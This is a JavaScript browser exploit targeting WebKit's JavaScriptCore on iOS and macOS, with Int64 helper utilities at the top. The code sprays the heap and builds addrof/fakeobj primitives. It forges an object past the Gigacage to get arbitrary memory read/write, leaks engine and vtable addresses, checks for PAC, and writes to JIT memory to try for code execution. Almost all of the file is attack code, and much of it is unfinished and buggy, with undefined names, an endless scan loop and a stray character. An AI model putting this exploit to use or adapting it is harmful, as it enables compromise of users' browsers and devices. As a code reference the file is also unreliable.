//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();


function ab2str(buf) {
  return String.fromCharCode.apply(null, new Uint16Array(buf));
}

function str2ab(str) {
  var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char
  var bufView = new Uint16Array(buf);
  for (var i=0, strLen=str.length; i < strLen; i++) {
    bufView[i] = str.charCodeAt(i);
  }
  return buf;
}


   
//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xfc || bytes[6] == 0xfc))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x2000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x2000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    this.lo = function()
    {
        var b = this.bytes();
        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
    };

    this.hi = function()
    {
        var b = this.bytes();
        return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
    };

    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

     // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    

    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// That's all the arithmetic we need for exploiting WebKit.. :)

function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc1() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}

function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}
function hex_to_ascii(str1)
 {
	var hex2  = str1.toString();
	var str = '';
	for (var n = 0; n < hex2.length; n += 2) {
		str += String.fromCharCode(parseInt(hex2.substr(n, 2), 16));
	}
	return str;
 }



      function hex1(x) {
    if (x < 0)
        return `-${hex1(-x)}`;
    return `0x${x.toString(16)}`;
}
let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => { //f2i
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => { //i2f
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
      const kBoxedDoubleOffset = 0x0002000000000000n;

    var array_spray = [];
    for (var i = 0; i < 1000; ++i) {
        array_spray[i] = [13.37+i, 13.37];
    }
    var structure_spray = [];
for (var i = 0; i < 1000; ++i) {
    var ary = [13.37];
    ary.prop = 13.37;
    ary['p'+i] = 13.37;
    structure_spray.push(ary);
}
    var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
    unboxed1[0] = 4.2; // no CopyOnWrite
  //alert("hehe")
      function boxDouble(d) {
        return d + kBoxedDoubleOffset;
      }
      function unboxDouble(d) {
        return d - kBoxedDoubleOffset;
      }
      // the structure ID is wrong, but we'll fix it :)
      let doubleArrayCellHeader = 0x0108230700000000n;
      let f = new Float64Array(1);
      let u = new Uint32Array(f.buffer);
      function float2bigint(v) {
        f[0] = v;
        return BigInt(u[0]) | (BigInt(u[1]) << 32n);
      }
      function bigint2float(v) {
        u[0] = Number(v & 0xffffffffn);
        u[1] = Number(v >> 32n);
        return f[0];
      }
      // store things to prevent GC
      let keep = [];
      function gc(n=10000) {
        let tmp = [];
        for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
      }
      // message port to talk to main thread; will be set later
      let port = null;
      //let port1 = null;
      // will be implemented later
      let fakeobj = null;
      let addrof = null;
      for (var i = 0; i < 100; i++) keep.push([1.1*i]);
      let a0 = [0,0,0,0,0,0,0,0,0,0];

      let a1 = [0,0,0,0,0,0,0,0,0,0];
      // transition to unboxed double storage
      a1[3] = 13.37;
      let b0 = [0,0,0,0,0,0,0,0,0,0];
      let b1 = [{},{},13.37]//[0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
      // put zeroes in first two slots so JSCallbackData destruction is safe
      delete b1[0];
      delete b1[1];
      function setupPrimitives() {
        
        port.postMessage("setting up");
        if (a1.length != 0x1337) {
          port.postMessage("Failure on array length");
          return;
        }

        //const kSentinel = 1333.337;
        var kSentinel = qwordAsFloat(0x41414141414141)
        let offset = -1;
        b1[0] = kSentinel;
        // scan for the sentinel to find the offset from a to b
        for (var i = 0; i < 0x100; i++) {
          if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) {
            port.postMessage("a1[i]" + typeof a1 + hex1(floatAsQword(qwordAsTagged(floatAsQword(a1[i])))))
            offset = i;
            break;
          }
        }
        if (offset == -1) {
          port.postMessage("Failure finding offset");
          return;
        }
        //port.postMessage("here")
        // temporary implementations
        addrof = (val) => {
          b1[0] = val;
          return floatAsQword(a1[offset]);
        }
        fakeobj = (addr) => {
          a1[offset] = qwordAsFloat(addr);
          return b1[0];
        }
        var victim1 = structure_spray[510];
        // Gigacage bypass: Forge a JSObject which has its butterfly pointing
        // to victim
        var boxed1 = [{}];
        var print = (msg) => {
          port.postMessage(msg);
        }
        print("unboxed @ " + hex1(addrof(unboxed1)));
        print("boxed @ " + hex1(addrof(boxed1)));

    var container = {
        header: qwordAsTagged(0x0108230900000000), // cell
        butterfly: victim1, // butterfly
    };
    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
    var boxed = [{}];

    print("outer @ " + hex1(addrof(container)));

    var hax = fakeobj(addrof(container) + 0x10);
    print("we have hax object ;)");
    print("after further work we can use this object for arbitrary r/w");
    print("now lets steal a real JSCellHeader")
    // Can now simply read a legitimate JSCell header and use it.
    var js_header = hax[0];
    container.header = js_header; 
    //print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
    
    // Can read/write to memory now by corrupting the butterfly
    // pointer of the float array.
    //hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
    //victim1[0] = 1337;
    let results = [];
    for (let i = 0; i < 2; i++) {
        let a = i == 0 ? hax : victim1;
        results.push(a[0]);
    }
    jscell_header = results[0];
    print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
      
    var stage2 = {
        addrof: function(obj) {
            return addrof(obj)
        },

        fakeobj: function(addr) {
            return fakeobj(addr)
        },

        write64: function(where, what) {
            hax[1] = qwordAsFloat(where + 0x10);
            victim1.prop = this.fakeobj(qwordAsFloat(what));
        },

        read64: function(where,offset) {
            //var reset = hax[1];
            if(offset) {
                offset *= 8
                return this.read64(where+offset);
            }
            hax[1] = qwordAsFloat(where + 0x10);
            var res = this.addrof(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return res;
        },
        readInt64: function(where) {
            //var reset = hax[1];
            hax[1] = qwordAsFloat(where + 0x10);
            var res = this.addrof(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return new Int64(res);
        },
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write64(Add(addr, 2 * i), ints[i]);
        },
        
        read(addr, length) {
            var a = new Array(length);
            var i;
            var v;

            for (i = 0; i + 8 < length; i += 8) {
                v = new Int64(this.read64(addr + i)).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = new Int64(this.read64(addr + i)).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a

        },

        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            port.postMessage(hex1(x.a))
            if (hex1(x.a) != 0x1337) {
                print('stage2 addrof/fakeobj does not work');
            }

            var val = 0x42424242;
            //this.write64(0x4141414141,0x999999999)
            //this.read64(0x999999)
            this.write64(shared_butterfly - 8, 0x42424242);
            print(hex1(floatAsQword(unboxed1[1])))
            if (qwordAsFloat(val) != unboxed1[1]) {
                print('stage2 write does not work');
            }

            if (this.read64(shared_butterfly + 8) != 0x42424242) {
                print('stage2 read does not work');
            }
        },

        clear: function() {
            outer = null;
            hax = null;
            for (var i = 0; i < unboxed_size; ++i)
                boxed1[i] = null;
            boxed1 = null
            unboxed1 = null
        },
    };
    print("we have arbitrary r/w with JSArray :)");
    var bb = {};
        bb[0] = 1.1
        var bbaddr = stage2.addrof(bb);
        //about to burn a vtable leak method publically RIP
         print("object address?" + hex1(bbaddr));
        var vm = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
        print("JSC::VM Struct @" + hex1(vm));
        //m_runloop contains a vtable at offset 0...
        // m_runloop is + 0x18 from JSC::VMStruct!
        var m_runloop = stage2.read64(vm + 0x18);
        //hopefully points to JavaScriptCore Base!
        print("m_runloop @ " + hex1(m_runloop))
        var vtable = stage2.read64(m_runloop);
        var jscbase = stage2.read64(vtable);
        print("vtable @ " + hex1(vtable));
        print("JSC __TEXT::text instance @ " + hex1(jscbase))
	var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
	print("JSC __TEXT header @" + header);
	
        var hdr = header;
        //var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
        //print("JSC header @" + header);
        //print("vtable dump : " + String.fromCharCode(...stage2.read(vtable, 0x100)))
        //print("JSC Lib header dump : " + ab2str(stage2.read(jscbase, 0x100)));
        print("lets attempt to find the dyld shared cache base");
	while(true) {
		jscbase -= 0x1000;
		print(hex1(jscbase) + " : " + ab2str(stage2.read(jscbase,0x10)));
	}
		
        /*while(true)
        {
        //FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
        if(strcmp(stage2.read(jscbase, 0x10), "dyld_v1   arm64")) //cache header magic
        //webcore header magic...
        {
            print("found dyld share cache base @ " + hex1(jscbase))
            print(String.fromCharCode(...stage2.read(jscbase, 0x10)))
            break;
        }
        jscbase = Sub(jscbase, 0x1000);
        print(String.fromCharCode(...stage2.read(jscbase, 0x10)))
        }*/
        /*print("object address?" + hex1(bbaddr));
        var vm = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
        print("JSC::VM Struct @" + hex1(vm));
        //m_runloop contains a vtable at offset 0...
        // m_runloop is + 0x18 from JSC::VMStruct!
        var m_runloop = stage2.read64(vm + 0x18);
        //hopefully points to JavaScriptCore Base!
        print("m_runloop @ " + hex1(m_runloop))
        var vtable = stage2.read64(m_runloop);
        var jscbase = stage2.read64(vtable);
        print("vtable @ " + hex1(vtable));
        print("JSC instance @ " + hex1(jscbase))
        var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
        print("JSC header @ " + header);*/
    /*print("testing arbitrary r/w capabilities")
    var tester = {a: 0x1337};
    var adddr = addrof(tester);
    var val = stage2.read64(adddr + 0x10);
    print("val should be 0x1337 if not it failed" + hex1(val));*/
    
    /*// "Point" refers to changing the given array's butterfly
    // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
    //
    // First, point victim[] to unboxed[]
    // Second, save the location of unboxed
    // Third, point victim[] to boxed[]
    // Finally, point unboxed[] and boxed[] to the same place (give them same bfly)
    // 
    // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
    // and then access them as objects with boxed[]
    hax[1] = unboxed;
    var tmp_bfly_ptr = victim1[1];
    print("shared butterfly @ " + hex1(tmp_bfly_ptr));
    hax[1] = boxed;
    victim1[1] = tmp_bfly_ptr;

    container.header = qwordAsTagged(0x0108230700000000);

    var stage2 = {
        addrof: function(obj) {
            return addrof(obj)
        },

        fakeobj: function(addr) {
            return fakeobj(addr)
        },

        write64: function(where, what) {
            hax[1] = qwordAsFloat(where + 0x10);
            victim1.prop = this.fakeobj(qwordAsFloat(what));
        },

        read64: function(where,offset) {
            //var reset = hax[1];
            if(offset) {
                offset *= 8
                return this.read64(where+offset);
            }
            hax[1] = qwordAsFloat(where + 0x10);
            var res = this.addrof(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return res;
        },
        readInt64: function(where) {
            //var reset = hax[1];
            hax[1] = qwordAsFloat(where + 0x10);
            var res = this.addrof(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return new Int64(res);
        },
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write64(Add(addr, 2 * i), ints[i]);
        },
        
        read(addr, length) {
            var a = new Array(length);
            var i;
            var v;

            for (i = 0; i + 8 < length; i += 8) {
                v = new Int64(this.read64(addr + i)).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = new Int64(this.read64(addr + i)).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a

        },

        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            port.postMessage(hex1(x.a))
            if (hex1(x.a) != 0x1337) {
                print('stage2 addrof/fakeobj does not work');
            }

            var val = 0x42424242;
            //this.write64(0x4141414141,0x999999999)
            //this.read64(0x999999)
            this.write64(shared_butterfly - 8, 0x42424242);
            print(hex1(floatAsQword(unboxed1[1])))
            if (qwordAsFloat(val) != unboxed1[1]) {
                print('stage2 write does not work');
            }

            if (this.read64(shared_butterfly + 8) != 0x42424242) {
                print('stage2 read does not work');
            }
        },

        clear: function() {
            outer = null;
            hax = null;
            for (var i = 0; i < unboxed_size; ++i)
                boxed1[i] = null;
            boxed1 = null
            unboxed1 = null
        },
    }; */

    /*
    //stage2.test();
            var v = 0x4141;
            var obj = {p: v};
            var addr1 = stage2.addrof(v);
            var addr = stage2.addrof(obj);
            port.postMessage("addr deb " + hex1(addr))
            port.postMessage(hex1(stage2.fakeobj(addr).p));
            port.postMessage("lolzzz");
            //var socket = new WebSocket("")
            //const socket = new TextEncoder();
            var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10; //Check for spectre mitigations
            var mathfunc = stage2.addrof(Math.sin)
            //port.postMessage("Math.sin @ " + hex1(mathfunc));

            var exe = stage2.read64(mathfunc+0x18) // 0x18
            //port.postMessage("Execute @"+ hex1(exe)) //+ "vs" + String.fromCharCode(...stage2.read(mathfunc+24,1000)))
            var jitcode = stage2.read64(exe+0x18) //codeaddr 0x18
            //print("JITCode @ " + new Int64(jitcode));
            //var rxMedewsa
            function makeJITCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}
    //var func = makeJITCompiledFunction();
    print("from here on out isn't my code creds to linushenze universal way of");
    print("obtaining code execution on mac OS...");
    var dontdoit = 0;
    var hasPac = function() {
    var funcAddr = stage2.addrof(Math.sin);
    print("[+] Math.sin() builtin @ " + hex1(funcAddr));
    var executableAddr = stage2.read64(funcAddr+0x18);
    print("[+] Executable instance @ " + hex1(executableAddr));
    var jitCodeAddr = stage2.read64(executableAddr+0x18);
    print("[+] JITCode instance @ " + hex1(jitCodeAddr));
    var rxMemAddr = new Int64(stage2.read64(jitCodeAddr));;
    print("r-x Memory @ " + rxMemAddr)
    if (ShiftRight(rxMemAddr, 4) == 0x7fff) {
            print("false")
            return false; // macOS Library Pointer - Shared Library cache
        } else if (ShiftRight(rxMemAddr, 5) == 0) {
            dontdoit = 1;
            //print("false")
            return false; // macOS/iOS Pointer - On macOS not from Shared Library cache, on iOS from Shared Library cache but without PAC
        }
        return true; 
    }();
    if(hasPac) {
        print("your device has PAC mitagation it is an iPhones XS(max) and up...");
        print("or a device like mac OS that has PAC");
    } else {
        print("your device doesn't have PAC so any iPhone below XS(max)")
    }

    function shouldwestrippacbits(addr) {
        if(hasPac) {
            return And(new Int64(addr), new Int64('0xFFFFFFFF8'));
        } else {
            return addr;
        }
    }

    function getJITFunction(rwx, silent) {
        if (silent == undefined) {
            silent = false;
        }
        
        var printFunc = print;
        if (silent) {
            print = function (str) {};
        }
        
        var shellcodeFunc = makeJITCompiledFunction();
        
        var shellcodeFuncAddr = stage2.addrof(shellcodeFunc);
        print("[+] Shellcode execution function @ " + hex1(shellcodeFuncAddr));
        
        var executableAddr = stage2.read64(shellcodeFuncAddr, 3);
        print("[+] Executable instance @ " + hex1(executableAddr));
        
        if(dontdoit == 1) { //avoid crashing as on i6s 14.5.1 reading after jitcode causes
            // a crash because address is invalid...

        //var rwxMemAddr = stage2.read64(jitCodeAddr, 4);
        print("[+] " + (rwx === false ? "RX" : "RWX") + " memory @ " + hex1(jitcode))
        var bb = {};
        bb[0] = 1.1
        var bbaddr = stage2.addrof(bb);
        print("object address?" + hex1(bbaddr));
        var vm = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
        print("JSC::VM Struct @" + hex1(vm));
        //m_runloop contains a vtable at offset 0...
        // m_runloop is + 0x18 from JSC::VMStruct!
        var m_runloop = stage2.read64(vm + 0x18);
        //hopefully points to JavaScriptCore Base!
        print("m_runloop @ " + hex1(m_runloop))
        var vtable = stage2.read64(m_runloop);
        var jscbase = stage2.read64(vtable);
        print("vtable @ " + hex1(vtable));
        print("JSC instance @ " + hex1(jscbase))
        var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
        print("JSC header @" + header);
        //print("Correct Header Char Code?" + String.fromCharCode(...stage2.read64(header)))

        /*while(true)
        {
        //FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
        if(strcmp(stage2.read(header, 0x10), "dyld_v1   arm64")) //cache header magic
        //webcore header magic...
        {
            print(String.fromCharCode(...stage.read(hdr, 0x10)))
            break;
        }
        hdr = Sub(hdr, 0x10000);
        }*/
        //print(String.fromCharCode(...stage2.read(jscbase,80)))
        //stage2.write64(hex1(stage2.read64((bbaddr&0xffffffffffffc000) - 0x128 + 8)),0x414141)
        //print("after removing bitmask +0x4000-0x128" + (hex1(stage2.read64(hex1(bbaddr)&0xffffc000))+0x4000-0x128))
        //p/x sizeof(JSC::MarkedBlock::Footer) = 0x128
        //MarkedBlock size 0x4000 bytes large

        //offset of m_vm is last + number
        //var vm = stage2.read64((bbaddr & 0xffffffffffffc000)+0x4000+0x128+8)//+0x8;
        //print("vm address?" + hex1(vm))
        //stage2.write64(vm,0x414141441414)


        /*print("We have stable memory rw primitives run this exploit on MacOS with \n" + "A version that has Safari 14.1 and it will yield you code execution...\n"+
        "Right now iOS doesn't have rwx memory for JIT so we will need a ROP Chain\n"+
        "which will require a shared cache parser that utilizes our memory rw\n"+
        "I have that already finished for iOS 12.1.4 on my github \n"+
        "but the problem is I can access DOM from this worker script in turn\n"+
        "I can't leak a vtable from to calculate the shared cache header address\n"+
        "so for now all i got to offer is the knowing of the r-x memory address\n"+
        "I will write 0x41414141 unseccessfully as it is mapped as read only\n"+
        "Should signal a SIGBus memory violation crash log and it should show the Read\n"+
        "only memory is in the crash log if your device have pac I will need to strip that\n"+
        "first... before doing so... So in 10 seconds I will trigger the crash...\n")/
        //sleep(5)
        //jitcode = shouldwestrippacbits(jitcode);
        //stage2.write64(jitcode,0x41414141)
        } else {
        var jitCodeAddr = stage2.read64(executableAddr, 3);
        print("[+] JITCode instance 1@ " + hex1(jitCodeAddr));
        var rwxMemAddr = shouldwestrippacbits(stage2.read64(jitCodeAddr, 4));
        print("[+] " + (rwx === true ? "RWX" : "RX") + " memory @ " + rwxMemAddr);
        stage2.write64(rwxMemAddr,0x41414141);
        shellcodeFunc();
        }
        
        //return [shellcodeFunc, rwxMemAddr];
    }
    getJITFunction(false)
    
    /*function detectOS() {
        var funcAddr = getJITFunction(false, true);
        var memAddr = funcAddr[1];
        
        print("[*] Checking device OS");
        
        var data = stage2.read(memAddr, 80);
        
        // Use the function prologue to detect which device we're running on
        function checkSignature(signature, startIndex) {
            if (startIndex === undefined) {
                startIndex = 0;
            }
            
            for (var i = startIndex; i < signature.length + startIndex; i++) {
                if (data[i] != signature.charCodeAt(i - startIndex)) {
                    return false;
                }
            }
            
            return true;
        }
        
        if (checkSignature("\x55\x48\x89\xE5")) { // x86_64: push rbp; mov rbp, rsp
            print("[+] Detected macOS");
            return "macOS";
        } else {
            print("[+] Detected iOS");
            print("can't do anything on iOS just yet print pretty shared cache char code");
            print(String.fromCharCode(...data));
            return "iOS";
        }
    }
    print(detectOS())*/

/*ready.then(function() {
    try {
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
        ws_log.send("Connection closed!");
        ws_log.close();
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});*/
            /*while(true) {
                Math.sin(100000000000)
                stage2.write64(jitcode,0x4141414141)
            }

            var rwx = -stage2.read64(jitcode+32) & 0xFFFFFFFF8
            print("rwx" + hex1(rwx))
            //var hdr = Sub(new Int64(jitcode), new Int64(jitcode).lo() & 0xfff);*/
        //cache
       /*struct dyld_cache_header
       {
           char        magic[16];                // e.g. "dyld_v0    i386" 0-0x10
           uint32_t    mappingOffset;            // file offset to first dyld_cache_mapping_info 10-0x14
           uint32_t    mappingCount;            // number of dyld_cache_mapping_info entries 14-0x18
           uint32_t    imagesOffset;            // file offset to first dyld_cache_image_info 18-0x1C
           uint32_t    imagesCount;            // number of dyld_cache_image_info entries 1c-0x20
           uint64_t    dyldBaseAddress;        // base address of dyld when cache was built 20-0x24
           //28?
           uint64_t    codeSignatureOffset;    // file offset of code signature blob //0x2C
           uint64_t    codeSignatureSize;        // size of code signature blob (zero means to end of file) //
           uint64_t    slideInfoOffset;        // file offset of kernel slid info 0x34
           uint64_t    slideInfoSize;            // size of kernel slid info 0x3C
           uint64_t    localSymbolsOffset;        // file offset of where local symbols are stored
           //0x44
           uint64_t    localSymbolsSize; //0x4C       // size of local symbols information
           uint8_t        uuid[16]; // 0x54                // unique value for each shared cache file
           uint64_t    cacheType;         //0x64      // 1 for development, 0 for optimized
       };*/
       
       //print('dyld cache header @' + jitcode); //dyld_cache_header
       //stage2.write64(jitcode,jitcode)
        /*while(true)
        {
        //FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
        if(strcmp(stage2.read(hdr,8), "dyld_v1   arm64")) //cache header magic
        //webcore header magic...
        {
            print(String.fromCharCode(...staged2read(hdr,8)))
            break;
        }
        hdr = hdr - 0x1000;
        }*/
            //var vtab = stage2.read64(exe) //vtab
            //var anchor = vtab - (vtab & 0xfff);
            //port.postMessage(hex1(jitcode) + "vtab?" + hex1(vtab));
            //var rwx = -(stage2.read64(jitcode+0x20) & 0xFFFFFFFF8) //anchor //0x26?
            //staged2read64(rwx)
            //var i = new Uint32Array(64);
            //i = (rwx % 0x100000000);

            //port.postMessage(hex1(rwx) + " lo " + hex1((rwx)))

